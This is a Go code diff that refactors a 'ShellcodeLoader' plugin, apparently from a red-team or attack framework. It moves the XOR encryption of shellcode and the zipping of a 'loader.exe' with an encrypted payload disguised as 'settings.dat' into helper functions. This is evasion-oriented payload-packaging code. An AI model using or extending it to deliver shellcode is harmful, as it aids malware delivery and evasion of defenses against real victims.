@@ -1,10 +1,6 @@
 package plugins
 
 import (
-	"archive/zip"
-	"bytes"
-	"encoding/binary"
-	"fmt"
 	"io/ioutil"
 	"os"
 	"os/exec"
@@ -50,15 +46,7 @@ func (l *ShellcodeLoader) getBuildWorkDir() string {
 
 // getShellcodeData 对shellcode做变形后的data
 func (l *ShellcodeLoader) getShellcodeData() []byte {
-	keyLen := utils.RandInt63(10, 100)
-	key := utils.RandStringRunes(keyLen)
-	buf := new(bytes.Buffer)
-	encryptShellcode := utils.XorEncryptDecrypt(l.shellcode, []byte(key))
-	binary.Write(buf, binary.LittleEndian, uint64(keyLen))
-	binary.Write(buf, binary.LittleEndian, []byte(key))
-	binary.Write(buf, binary.LittleEndian, uint64(len(encryptShellcode)))
-	binary.Write(buf, binary.LittleEndian, []byte(encryptShellcode))
-	return buf.Bytes()
+	return utils.CustomEncryptData(l.shellcode)
 }
 
 // loaderIsExist 获取shellcode loader是否存在
@@ -74,32 +62,17 @@ func (l *ShellcodeLoader) getZipPath() (string, error) {
 	if err != nil {
 		return "", err
 	}
-	f, err := ioutil.TempFile(os.TempDir(), fmt.Sprintf("*-%s.zip", l.PluginName))
-	if err != nil {
-		return "", err
+	var files = []utils.FileData{
+		{
+			Name: "loader.exe",
+			Body: loaderData,
+		},
+		{
+			Name: "settings.dat",
+			Body: shellcodeData,
+		},
 	}
-	defer f.Close()
-	// 把loader和payload压缩成zip
-	zipWriter := zip.NewWriter(f)
-	defer zipWriter.Close()
-	var files = []struct {
-		Name string
-		Body []byte
-	}{
-		{"loader.exe", loaderData},
-		{"settings.dat", shellcodeData},
-	}
-	for _, file := range files {
-		zipFile, err := zipWriter.Create(file.Name)
-		if err != nil {
-			return "", err
-		}
-		_, err = zipFile.Write(file.Body)
-		if err != nil {
-			return "", err
-		}
-	}
-	return f.Name(), nil
+	return utils.ZipData(files)
 }
 
 func (l *ShellcodeLoader) Run() ([]byte, error) {
